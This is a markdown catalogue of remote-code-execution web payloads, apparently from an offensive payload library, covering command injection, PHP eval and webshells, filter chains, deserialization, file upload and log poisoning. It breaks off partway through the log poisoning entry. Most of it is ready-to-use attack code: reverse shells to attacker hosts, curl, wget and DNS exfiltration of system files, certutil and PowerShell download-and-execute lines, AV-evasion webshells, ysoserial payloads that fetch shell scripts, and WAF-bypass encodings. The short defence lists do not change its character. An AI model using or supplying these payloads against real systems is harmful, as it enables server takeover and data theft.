# RCE Remote Code Execution

_12 web payloads_

### Command Injection  `rce-command-injection`
_Operating system command injection attack techniques_
Subcategory: **Command Injection** · tags: `rce` `command` `injection` `os`

**Prerequisites:**
- A system command execution feature exists
- User input is not filtered

**Attack Chain:**

**1. Probe for command injection**
> Probe for a command injection point
```
; id
| id
`id`
$(id)
&& id
|| id
test;id
test|id
```
**Syntax breakdown:**
- `;` — Linux command separator _operator_
- `|` — pipe, passes output _operator_
- `` ` `` — backtick command substitution _value_
- `$()` — command substitution syntax _function_
- `&&` — execute after the previous command succeeds _operator_
- `||` — execute after the previous command fails _operator_

**2. Linux command injection**
> Linux system command injection
_platform: linux_
```
; whoami
; id
; cat /etc/passwd
; ls -la /
; nc -e /bin/bash attacker.com 4444
; bash -i >& /dev/tcp/attacker/4444 0>&1
```
**Syntax breakdown:**
- `whoami` — display the current user _command_
- `nc -e` — Netcat reverse shell _value_
- `/dev/tcp` — Bash network redirection _value_

**3. Windows command injection**
> Windows system command injection
_platform: windows_
```
& whoami
& dir
& type C:\windows\win.ini
& certutil -urlcache -split -f http://attacker/shell.exe shell.exe & shell.exe
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"
```
**Syntax breakdown:**
- `&` — Windows command separator _operator_
- `certutil` — Windows download tool _value_
- `powershell -c` — execute a PowerShell command _value_

**4. Blind command injection**
> Blind command injection probing
```
; sleep 5
; ping -c 5 attacker.com
& timeout 5
Determine whether the command executed based on the response time difference
```
**Syntax breakdown:**
- `sleep` — Linux delay command _keyword_
- `timeout` — Windows delay command _value_

**5. Data exfiltration**
> Obtain data via an out-of-band channel
_platform: linux_
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id|base64)
; nslookup $(whoami).attacker.com
; ping $(whoami | xxd -p).attacker.com
```
**Syntax breakdown:**
- `curl` — HTTP request tool _command_
- `nslookup` — DNS query tool _value_
- `xxd -p` — convert to hexadecimal _value_

**WAF/EDR Bypass Variants:**

**Space bypass**
> Bypass space filtering
_platform: linux_
```
;{cat,/etc/passwd}
;cat$IFS/etc/passwd
;cat</etc/passwd
;cat%09/etc/passwd
;cat${IFS}/etc/passwd
```
**Syntax breakdown:**
- `$IFS` — Internal Field Separator variable _variable_
- `%09` — URL encoding of the Tab character _encoding_
- `{}` — brace expansion _value_

**Keyword bypass**
> Bypass keyword filtering
_platform: linux_
```
; c''at /etc/passwd
; c""at /etc/passwd
; c\at /etc/passwd
; /bin/c?a?t /etc/passwd
; /bin/ca[t] /etc/passwd
```

**Encoding bypass**
> Bypass using encoding
_platform: linux_
```
; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
; $(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```
**Syntax breakdown:**
- `base64 -d` — Base64 decode _value_
- `printf "\x"` — hexadecimal encoding _value_

**Overview:** OS command injection allows an attacker to execute arbitrary system commands on the server's operating system via a web application. The vulnerability typically appears in scenarios where the application invokes system commands to process user input (such as file operations, network diagnostics, data processing, etc.).

**Vulnerability Principle:** The root cause of command injection is that the application concatenates user input directly into system command execution functions such as system()/exec()/popen(). An attacker links malicious commands via shell metacharacters such as the pipe (|), semicolon (;), backtick (`), and $(), breaking through the expected behavior of the original command.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the command injection point
2. Determine the operating system type
3. Bypass the filtering mechanism
4. Execute malicious commands
5. Obtain a shell or steal data

**Defensive Measures:** Defenses:
1. Avoid using system command execution functions
2. Use parameterized API calls
3. Strict input validation and allowlisting
4. Run with least privilege
5. Disable dangerous functions

---

### PHP Code Execution  `rce-php`
_PHP code execution vulnerability exploitation techniques_
Subcategory: **PHP Code Execution** · tags: `rce` `php` `code` `execution`

**Prerequisites:**
- A PHP code execution point exists
- User input can control the code

**Attack Chain:**

**1. Common dangerous functions**
> PHP dangerous functions
```
eval($_POST[cmd]);
assert($_POST[cmd]);
preg_replace('/a/e',$_POST[cmd],'a');
create_function('',$_POST[cmd]);
array_map($_POST[func],$_POST[arr]);
call_user_func($_POST[func],$_POST[arg]);
```
**Syntax breakdown:**
- `eval()` — execute a string as PHP code _function_
- `assert()` — assertion function, can execute code _function_
- `preg_replace /e` — regex replacement execution mode _value_
- `create_function()` — dynamically create a function _function_

**2. Command execution**
> PHP command execution functions
```
system('whoami');
exec('whoami');
shell_exec('whoami');
passthru('whoami');
popen('whoami','r');
proc_open('whoami',$desc,$pipes);
`whoami`;
```
**Syntax breakdown:**
- `system()` — execute a command and output the result _function_
- `exec()` — execute a command and return the last line _function_
- `shell_exec()` — execute a command and return all output _function_
- `` ` `` — backtick command execution _value_

**3. One-liner webshell**
> Common one-liner webshells
```
<?php @eval($_POST[cmd]);?>
<?php @assert($_POST[cmd]);?>
<?php @system($_GET[cmd]);?>
<?php $a=create_function('',$_POST[cmd]);$a();?>
```
**Syntax breakdown:**
- `system()` — system command execution _function_
- `eval()` — code execution _function_

**4. AV-evasion one-liner**
> AV-evasion one-liner webshell
```
<?php $a='ev'.$_POST[1];$a($_POST[cmd]);?>
<?php $_='a'.'s'.'s'.'e'.'r'.'t';$_($_POST[cmd]);?>
<?php $a=base64_decode('YXNzZXJ0');$a($_POST[cmd]);?>
```
**Syntax breakdown:**
- `<?php` — command/keyword _command_

**WAF/EDR Bypass Variants:**

**Callback function bypass**
> Use a callback function
```
array_map('assert',array($_POST[cmd]));
call_user_func('assert',$_POST[cmd]);
$a='assert';$a($_POST[cmd]);
```
**Syntax breakdown:**
- `array_map` — PHP array mapping callback function _function_
- `assert` — assertion function that executes PHP code _function_
- `call_user_func` — call a user callback function _function_
- `$_POST[cmd]` — obtain the command from the POST parameter _variable_

**Variable function bypass**
> WAF bypass technique
```
$func=$_GET['func'];$cmd=$_GET['cmd'];$func($cmd);
```
**Syntax breakdown:**
- `$func=$_GET["func"]` — obtain the function name from the GET parameter _variable_
- `$cmd=$_GET["cmd"]` — obtain the command from the GET parameter _variable_
- `$func($cmd)` — variable function call, dynamic execution _technique_

**Overview:** PHP code execution vulnerabilities execute user input as PHP code via functions such as eval()/assert()/preg_replace(e modifier)/array_map(), which can directly read files, operate the database, execute system commands, and so on.

**Vulnerability Principle:** PHP dangerous functions include: eval()/assert() directly execute a code string, the e modifier of preg_replace() (PHP<7) executes the replacement result as code, create_function()/call_user_func() dynamic function calls, array_map()/usort() callback function injection.

**Exploitation Method:** Complete exploitation flow:
1. Discover the code execution point
2. Construct malicious code
3. Execute a system command
4. Write a WebShell
5. Obtain server privileges

**Defensive Measures:** Defenses:
1. Disable dangerous functions
2. Use allowlist validation of input
3. Use parameterized calls
4. Least privilege principle

---

### PHP Filter Chain RCE  `rce-php-filter`
_Use a PHP Filter chain to construct RCE_
Subcategory: **PHP Filter Chain** · tags: `rce` `php` `filter` `chain`

**Prerequisites:**
- A file inclusion vulnerability exists
- The PHP version supports filter chains

**Attack Chain:**

**1. Filter chain principle**
> Filter chain principle
```
Use filters such as php://filter's convert.base64-decode
Through carefully crafted input, ultimately generate executable code
```
**Syntax breakdown:**
- `Use filters such as php://filter's convert.base64-decode
Through carefully crafted input, ultimately generate executable code` — attack payload _value_

**2. Construct the Filter chain**
> Construct the Filter chain
```
php://filter/convert.base64-decode/resource=data://,plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
Chain multiple filters together
```
**Syntax breakdown:**
- `php://filter` — PHP filter protocol _value_
- `convert.base64-decode` — Base64 decode filter _value_
- `resource=` — specify the resource _value_

**3. Generate using a tool**
> Generate the Filter chain using a tool
```
# Use php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"

# Output the directly usable Filter chain
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Use php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"

# Output the directly usable Filter chain` — parameters and payload content _value_

**4. Complete exploitation example**
> Complete Filter chain example
```
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
```
**Syntax breakdown:**
- `?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.` — attack payload _value_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Encoding combination bypass
```
Use different encoding filter combinations
to bypass keyword detection
```
**Syntax breakdown:**
- `Use different encoding filter combinations
to bypass keyword detection` — attack payload _value_

**Overview:** PHP Filter chain RCE is a new technique discovered in 2022. By carefully combining multiple php://filter filters (iconv character set conversion), arbitrary content is generated from scratch without using file upload, and combined with include, RCE is achieved.

**Vulnerability Principle:** PHP Filter chains exploit the combined effect of iconv character set conversion filters: through a specific character set conversion sequence (such as UTF-7→UTF-8), arbitrary PHP code is constructed byte by byte. A single LFI vulnerability (include($_GET["file"])) combined with a filter chain can achieve RCE directly, without file upload or log poisoning.

**Exploitation Method:** Complete exploitation flow:
1. Discover the file inclusion vulnerability
2. Generate the Filter chain using a tool
3. Construct a malicious request
4. Execute arbitrary code

**Defensive Measures:** Defenses:
1. Disable php://filter
2. Restrict file paths with an allowlist
3. Disable dangerous filters
4. Upgrade the PHP version

---

### Blind Command Injection  `rce-cmd-blind`
_Command injection exploitation techniques with no response echo_
Subcategory: **Blind Command Injection** · tags: `rce` `blind` `command` `injection`

**Prerequisites:**
- A command injection point exists
- No direct response echo

**Attack Chain:**

**1. Time-based blind injection**
> Use a delay to determine
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& timeout 5
Observe the response time to determine whether the command executed
```
**Syntax breakdown:**
- `sleep 5` — Linux delay command _value_
- `timeout 5` — Windows delay command _value_

**2. DNS exfiltration**
> DNS data exfiltration
```
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
; host $(id | base64).attacker.com
& nslookup %USERNAME%.attacker.com
```
**Syntax breakdown:**
- `nslookup` — DNS query tool _value_
- `$(whoami)` — command substitution to obtain the username _value_
- `.attacker.com` — the attacker-controlled domain _domain_

**3. HTTP exfiltration**
> HTTP data exfiltration
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id)
; curl -d @/etc/passwd http://attacker.com/
& certutil -urlcache -f http://attacker.com/?data=%USERNAME%
```
**Syntax breakdown:**
- `; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(i` — attack payload _value_

**4. ICMP exfiltration**
> ICMP data exfiltration
_platform: linux_
```
; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp
Listen for ICMP packets on the attacker's server
```
**Syntax breakdown:**
- `; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp
Listen for ICMP packets on the attacker's serv` — attack payload _value_

**5. Reverse shell**
> Reverse shell
```
; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
; nc -e /bin/bash attacker 4444
; python -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```
**Syntax breakdown:**
- `; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
; nc -e /bin/bash attacker 4` — attack payload _value_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> Base64 encoding bypass
_platform: linux_
```
; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash
Use Base64 encoding to bypass
```
**Syntax breakdown:**
- `;` — command/payload start _command_
- ` echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash
Use Base64 encoding to bypass` — parameters and payload content _value_

**Overview:** Blind command injection refers to the scenario where command execution succeeds but the result is not echoed in the response, requiring indirect methods such as DNS exfiltration (nslookup), HTTP exfiltration (curl), delay-based determination (sleep), or writing files to confirm the vulnerability exists and extract data.

**Vulnerability Principle:** Confirmation and exploitation methods for blind command injection: 1) time delay (;sleep 5) to determine execution 2) DNS exfiltration (;nslookup $(whoami).attacker.com) to obtain command output 3) HTTP exfiltration (curl http://attacker.com/$(cat /etc/hostname)) 4) write to the web directory and access it via HTTP to obtain the result.

**Exploitation Method:** Complete exploitation flow:
1. Confirm command injection exists (time-based blind injection)
2. Use an out-of-band channel to obtain data
3. Construct a reverse shell
4. Obtain server privileges

**Defensive Measures:** Defenses:
1. Avoid using system commands
2. Use a parameterized API
3. Input allowlist validation
4. Disable dangerous functions

---

### Deserialization Vulnerability  `rce-deserialize`
_Use a deserialization vulnerability to achieve RCE_
Subcategory: **Deserialization** · tags: `rce` `deserialize` `java` `php`

**Prerequisites:**
- A deserialization point exists
- An exploitable gadget chain exists

**Attack Chain:**

**1. Java deserialization**
> Java deserialization
```
# Common vulnerable components
Apache Commons Collections
Spring Framework
Fastjson
Jackson
WebLogic

# Use ysoserial to generate the payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"
```
**Syntax breakdown:**
- `ysoserial` — Java deserialization exploitation tool _value_
- `CommonsCollections1` — exploit chain name _encoding_

**2. PHP deserialization**
> PHP deserialization
```
<?php
class Exploit {
    public $cmd = "system('whoami');";
    function __destruct() {
        eval($this->cmd);
    }
}
echo serialize(new Exploit());
?>
Generates: O:6:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**3. Python deserialization**
> Python pickle deserialization
```
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
# Send the payload to trigger deserialization
```
**Syntax breakdown:**
- `import` — command/keyword _command_

**4. .NET deserialization**
> .NET deserialization
_platform: windows_
```
# Use ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"

# Common formats
BinaryFormatter
Json.NET
XMLSerializer
```
**Syntax breakdown:**
- `# Use ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"` — attack payload _value_

**WAF/EDR Bypass Variants:**

**Signature bypass**
> Bypass signature validation
```
If signature validation exists
you need to obtain the key and re-sign
```
**Syntax breakdown:**
- `If signature validation exists
you need to obtain the key and re-sign` — attack payload _value_

**Overview:** A deserialization vulnerability triggers malicious operations when restoring untrusted data into an object. It exists in multiple languages such as Java/PHP/Python/.NET. An attacker constructs special serialized data that automatically calls dangerous methods during deserialization to achieve RCE.

**Vulnerability Principle:** Deserialization attacks exploit the magic methods automatically called when an object is restored (such as Java's readObject, PHP's __wakeup/__destruct). Through a POP (Property Oriented Programming) chain, method calls of multiple classes are linked to ultimately trigger command execution.

**Exploitation Method:** Complete exploitation flow:
1. Identify the deserialization point
2. Analyze the available gadget chains
3. Generate malicious serialized data
4. Send it to trigger RCE

**Defensive Measures:** Defenses:
1. Avoid deserializing untrusted data
2. Use allowlist class restrictions
3. Disable dangerous gadgets
4. Use a secure serialization format

---

### PHP Deserialization  `rce-deserialize-php`
_PHP deserialization vulnerability exploitation techniques_
Subcategory: **PHP Deserialization** · tags: `rce` `php` `deserialize` `unserialize`

**Prerequisites:**
- An unserialize call exists
- An exploitable class exists

**Attack Chain:**

**1. Magic methods**
> PHP magic methods
```
__construct() - called when the object is created
__destruct() - called when the object is destroyed
__wakeup() - called during deserialization
__toString() - called when the object is converted to a string
__call() - triggered when a nonexistent method is called
```
**Syntax breakdown:**
- `__destruct()` — automatically called when the object is destroyed, often used as the entry point of a POP chain _command_
- `__wakeup()` — automatically called during deserialization, can be bypassed by CVE-2016-7124 _command_
- `__toString()` — triggered when the object is converted to a string, such as echo/print/string concatenation _command_
- `__call()` — triggered when a nonexistent method is called, usable for dynamic method jumps _command_

**2. Construct a POP chain**
> Construct a POP chain
```
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>
```
**Syntax breakdown:**
- `class Chain` — the entry class, when __destruct triggers it calls obj's action method _command_
- `$this->obj->action()` — chained call, jumps to the target class method via the object property _operator_
- `system($this->cmd)` — the sink point that ultimately executes the system command _value_
- `serialize($payload)` — serialize the constructed object chain into a string payload _command_

**3. Phar deserialization**
> Phar deserialization
```
# Generate the Phar file
<?php
class Exploit {}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>

# Trigger deserialization
phar://exploit.phar/test.txt
```
**Syntax breakdown:**
- `new Phar()` — create a Phar archive file object _command_
- `setStub()` — set the Phar file header identifier, __HALT_COMPILER() is the required terminator _parameter_
- `setMetadata($o)` — set the metadata to a malicious object, automatically deserialized when the Phar is read _value_
- `phar://exploit.phar` — the phar:// stream wrapper triggers metadata deserialization _command_

**4. Session deserialization**
> Session deserialization
```
# Exploit Session handler differences
# php_serialize vs php_binary
Construct malicious Session data to trigger deserialization
```
**Syntax breakdown:**
- `php_serialize` — Session serialization handler, uses the standard serialize format _parameter_
- `php_binary` — another Session handler, uses a binary format _parameter_
- `Handler differences` — the different separators of different handlers allow injecting malicious serialized data _value_

**WAF/EDR Bypass Variants:**

**Property modifier bypass**
> Property modifier handling
```
Use public/private/protected properties
Note the serialization format differences:
public: s:3:"cmd"
private: s:8:"\0Class\0cmd"
protected: s:7:"\0*\0cmd"
```
**Syntax breakdown:**
- `public: s:3:"cmd"` — public property directly serializes the property name _value_
- `private: s:8:"\0Class\0cmd"` — a private property adds \\0 and the class name before and after, the length includes null bytes _value_
- `protected: s:7:"\0*\0cmd"` — a protected property adds \\0 and * before and after _value_

**Overview:** PHP deserialization triggers magic methods (__destruct/__wakeup/__toString, etc.) when the unserialize() function processes user-controllable data, and achieves RCE by calling dangerous functions such as system()/exec() via a POP chain.

**Vulnerability Principle:** PHP deserialization exploit chain: unserialize() triggers __wakeup() or __destruct() is triggered after deserialization, and by modifying object properties to point to methods of other classes (POP chain), a command execution function is ultimately called. Common exploitation frameworks include Laravel (PendingBroadcast chain), Yii (BatchQueryResult chain), and others.

**Exploitation Method:** Complete exploitation flow:
1. Find the unserialize call point
2. Analyze exploitable classes
3. Construct a POP chain
4. Generate the serialized payload
5. Send it to trigger RCE

**Defensive Measures:** Defenses:
1. Avoid deserializing user input
2. Use json_encode instead
3. Allowlist class restrictions
4. Disable Phar

---

### Java Deserialization  `rce-deserialize-java`
_Java deserialization vulnerability exploitation techniques_
Subcategory: **Java Deserialization** · tags: `rce` `java` `deserialize` `ysoserial`

**Prerequisites:**
- A Java deserialization point exists
- A gadget chain exists

**Attack Chain:**

**1. Common gadget chains**
> Common gadget chains
```
CommonsCollections - Apache Commons Collections
CommonsBeanutils - Apache Commons BeanUtils
Spring - Spring Framework
Jdk7u21 - JDK native gadget
Groovy - Apache Groovy
Hibernate - Hibernate ORM
```
**Syntax breakdown:**
- `CommonsCollections` — Apache CC library gadget chain, the most classic Java deserialization exploit chain _command_
- `CommonsBeanutils` — Apache BeanUtils gadget, exploits property access to trigger execution _command_
- `Jdk7u21` — JDK native gadget, requires no third-party dependencies, exploits AnnotationInvocationHandler _command_
- `Hibernate` — Hibernate ORM gadget, exploits HQL queries to trigger code execution _command_

**2. Use ysoserial**
> Use ysoserial to generate the payload
```
# List all gadgets
java -jar ysoserial.jar

# Generate the payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" > payload.ser
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```
**Syntax breakdown:**
- `java -jar ysoserial.jar` — run the ysoserial deserialization payload generation tool _command_
- `CommonsCollections1` — specify the gadget chain name to use _parameter_
- `"curl attacker.com/shell.sh|bash"` — the system command to execute (commonly used for a reverse shell) _value_
- `> payload.ser` — save the generated serialized data as a binary file _operator_
- `{echo,BASE64}|{base64,-d}|{bash,-i}` — Bash brace expansion to bypass space and special character restrictions _value_

**3. JRMP attack**
> JRMP attack
```
# Start the JRMP service
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"

# Send the JRMP client payload
java -jar ysoserial.jar JRMPClient attacker:4444
```
**Syntax breakdown:**
- `ysoserial.exploit.JRMPListener` — start a malicious JRMP server, waiting for the target to connect _command_
- `4444` — JRMP listening port _value_
- `CommonsCollections1` — the gadget chain type the server returns to the client _parameter_
- `JRMPClient` — generate the JRMP client payload, the target connects to the attacker after deserialization _command_

**4. In-memory shell injection**
> In-memory shell injection
```
# Use ysoserial to inject an in-memory shell
java -jar ysoserial.jar CommonsCollections1 "generate in-memory shell bytecode"

# Or use a tool
java -jar ysuserial.jar CommonsCollections1 "in-memory shell command"
```
**Syntax breakdown:**
- `In-memory shell` — a fileless WebShell, a Servlet/Filter/Listener injected into JVM memory _command_
- `Bytecode` — compiled Java class bytecode, dynamically loaded at runtime _parameter_
- `CommonsCollections1` — use the CC chain to trigger the ClassLoader to load the malicious bytecode _value_

**WAF/EDR Bypass Variants:**

**Double deserialization**
> Double deserialization bypass
```
Use SignedObject or RMI to bypass the blacklist
```
**Syntax breakdown:**
- `SignedObject` — a JDK built-in class that wraps another serialized object to bypass blacklist detection _command_
- `RMI` — Remote Method Invocation, transmits serialized objects over the network to bypass local detection _command_

**Reflection bypass**
> Reflection bypass
```
Use reflection to set properties to bypass restrictions
```
**Syntax breakdown:**
- `Reflection` — the Java reflection mechanism dynamically modifies object properties at runtime to bypass restrictions _command_
- `setAccessible(true)` — break through the private access restriction and modify private field values _parameter_

**Overview:** Java deserialization is one of the most destructive vulnerability types. Using gadget chains in libraries such as Apache Commons Collections/BeanUtils, it triggers arbitrary code execution during ObjectInputStream.readObject().

**Vulnerability Principle:** Java deserialization uses tools such as ysoserial to generate gadget chains: the CommonsCollections series (InvokerTransformer chain), CommonsBeanutils (BeanComparator chain), URLDNS (DNS probing), and so on. The serialized data (AC ED 00 05 magic bytes) appears in locations such as Cookies/HTTP parameters/JMX/RMI.

**Exploitation Method:** Complete exploitation flow:
1. Identify the deserialization point
2. Detect the dependency libraries
3. Choose an appropriate gadget chain
4. Generate the payload
5. Send it to trigger RCE

**Defensive Measures:** Defenses:
1. Upgrade the dependency library version
2. Use ObjectInputFilter
3. Allowlist class restrictions
4. Disable deserialization

---

### File Upload Vulnerability  `rce-file-upload`
_Use a file upload vulnerability to obtain RCE_
Subcategory: **File Upload** · tags: `rce` `upload` `webshell` `file`

**Prerequisites:**
- A file upload feature exists
- An executable file can be uploaded

**Attack Chain:**

**1. Basic upload**
> Directly upload an executable file
```
Upload a PHP file: shell.php
Upload a JSP file: shell.jsp
Upload an ASPX file: shell.aspx
Upload a CGI file: shell.cgi
```
**Syntax breakdown:**
- `shell.php` — PHP WebShell file, the server will directly parse and execute it _value_
- `shell.jsp` — Java WebShell, runs in containers such as Tomcat/JBoss _value_
- `shell.aspx` — .NET WebShell, runs on an IIS server _value_

**2. Frontend bypass**
> Bypass frontend validation
```
# Modify the Content-Type
Content-Type: image/jpeg

# Modify the file extension
test.php -> test.jpg.php
test.php -> test.php.jpg

# Use a null byte
test.php%00.jpg
```
**Syntax breakdown:**
- `Content-Type: image/jpeg` — modify the MIME type to deceive frontend/backend validation _parameter_
- `test.php.jpg` — double extension, some servers parse left to right and take the first _value_
- `test.php%00.jpg` — null byte truncation (PHP<5.3.4), content after %00 is ignored _value_

**3. Backend bypass**
> Bypass the backend blacklist
```
# Blacklist bypass
.php -> .phtml, .php3, .php5, .pht
.asp -> .asa, .cer, .cdx
.jsp -> .jspx, .jspf

# Case bypass
.Php, .pHp, .PHP

# Double-write bypass
.pphphp
```
**Syntax breakdown:**
- `.phtml, .php3, .php5, .pht` — PHP alternative extensions, not in the common blacklist _value_
- `.Php, .pHp` — mixed case to bypass Windows' case-insensitive filesystem _value_
- `.pphphp` — double-write bypass, after the backend removes php the remainder concatenates to .php _value_

**4. Image-embedded shell**
> Create an image-embedded shell
```
# Create an image-embedded shell
copy test.jpg/b + shell.php/a shell.jpg

# Use file inclusion to execute
include($_GET['file']);
?file=upload/shell.jpg
```

**5. .htaccess upload**
> Use .htaccess
_platform: linux_
```
# Upload the .htaccess file
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# Afterward, uploaded jpg files will be executed as PHP
```
**Syntax breakdown:**
- `AddType application/x-httpd-php .jpg` — make Apache parse .jpg files as PHP scripts _command_
- `AddHandler php-script .jpg` — another configuration method, add the PHP handler for .jpg _command_

**WAF/EDR Bypass Variants:**

**Content-Type bypass**
> Content-Type bypass
```
Modify the Content-Type in the request to an allowed type
image/jpeg, image/png, image/gif
```
**Syntax breakdown:**
- `Content-Type` — the MIME type field in the HTTP request header _parameter_
- `image/jpeg` — disguise as the JPEG image MIME type to bypass server-side detection _value_
- `image/png, image/gif` — other common allowlisted MIME types _value_

**File header bypass**
> File header bypass
```
Add an image file header before the malicious file
GIF89a<?php eval($_POST[cmd]);?>
```
**Syntax breakdown:**
- `GIF89a` — GIF file magic header (file signature), 6 bytes _command_
- `<?php eval([cmd]);?>` — append PHP code after the file header _value_

**Overview:** File upload RCE uploads a file containing malicious code (WebShell) to a web-accessible directory on the server, then accesses that file via an HTTP request to trigger code execution. It is one of the most direct ways to obtain server privileges.

**Vulnerability Principle:** Conditions for file upload RCE: 1) the server allows uploading executable files (PHP/JSP/ASP) 2) the upload directory is under the web root and accessible via URL 3) the server parses the uploaded file as a script. Bypass methods include extension name transformation, Content-Type tampering, path traversal, and so on.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the upload restrictions
2. Choose a bypass method
3. Upload the WebShell
4. Access to execute
5. Obtain server privileges

**Defensive Measures:** Defenses:
1. Validate the extension against an allowlist
2. Check the file content
3. Rename the uploaded file
4. Store in a non-web directory
5. Disable execution permissions

---

### File Inclusion RCE  `rce-include`
_Use a file inclusion vulnerability to achieve RCE_
Subcategory: **File Inclusion** · tags: `rce` `include` `lfi` `rfi`

**Prerequisites:**
- A file inclusion vulnerability exists
- A malicious file can be included

**Attack Chain:**

**1. Log poisoning**
> Log poisoning RCE
_platform: linux_
```
# Inject code into the log
User-Agent: <?php system($_GET['cmd']);?>

# Include the log file
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/nginx/access.log&cmd=whoami
```
**Syntax breakdown:**
- `/var/log/apache2/access.log` — Apache access log _path_
- `/var/log/nginx/access.log` — Nginx access log _path_

**2. Session file inclusion**
> Session file inclusion
_platform: linux_
```
# Inject code into the Session
?file=/var/lib/php/sessions/sess_[PHPSESSID]

# Session content
<?php system($_GET['cmd']);?>
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**3. /proc/self/environ**
> Include environment variables
_platform: linux_
```
# Inject code into environment variables
User-Agent: <?php system($_GET['cmd']);?>

# Include the environment variables file
?file=/proc/self/environ&cmd=whoami
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**4. PHP pseudo-protocols**
> PHP pseudo-protocol exploitation
```
# php://input
?file=php://input
POST: <?php system('whoami');?>

# data:// protocol
?file=data://text/plain,<?php system('whoami');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
```
**Syntax breakdown:**
- `system()` — execute a system command _function_
- `php://input` — PHP raw input stream _technique_

**5. Remote file inclusion**
```
# RFI directly includes a remote shell
?file=http://attacker.com/shell.txt

# shell.txt content
<?php system($_GET['cmd']);?>
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> URL encoding bypass
```
?file=%2fvar%2flog%2fapache2%2faccess.log
URL-encode the path
```
**Syntax breakdown:**
- `?file=%2fvar%2flog%2fapache2%2faccess.log
URL-encode the path` — attack payload _value_

**Overview:** File inclusion RCE upgrades an LFI/RFI vulnerability to code execution, injecting and executing malicious PHP code by including log files, Session files, /proc/self/environ, temporary uploaded files, and so on.

**Vulnerability Principle:** Multiple exploitation paths for file inclusion RCE: 1) log poisoning (User-Agent injection of PHP code → include access.log) 2) Session file inclusion (inject code into the Session → include /tmp/sess_xxx) 3) User-Agent in /proc/self/environ 4) PHP temporary uploaded file race condition.

**Exploitation Method:** Complete exploitation flow:
1. Discover the file inclusion point
2. Inject malicious code
3. Include the malicious file
4. Execute a system command
5. Obtain a shell

**Defensive Measures:** Defenses:
1. Validate file paths against an allowlist
2. Disable remote file inclusion
3. Disable PHP pseudo-protocols
4. Use open_basedir restriction

---

### Log Poisoning RCE  `rce-log-poison`
_Use log poisoning to achieve RCE_
Subcategory: **Log Poisoning** · tags: `rce` `log` `poison` `lfi`

**Prerequisites:**
- A file inclusion vulnerability exists
- The log file can be read

**Attack Chain:**

**1. Apache log poisoning**
> Apache log poisoning
_platform: linux_
```
# Inject code into the access log
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# Include the log to execute
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/httpd/access_log&cmd=whoami
```
**Syntax breakdown:**
- `/var/log/apache2/access.log` — Debian/Ubuntu log path _path_
- `/var/log/httpd/access_log` — CentOS/RHEL log path _path_

**2. Nginx log poisoning**
```
# Inject code
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# Include the log
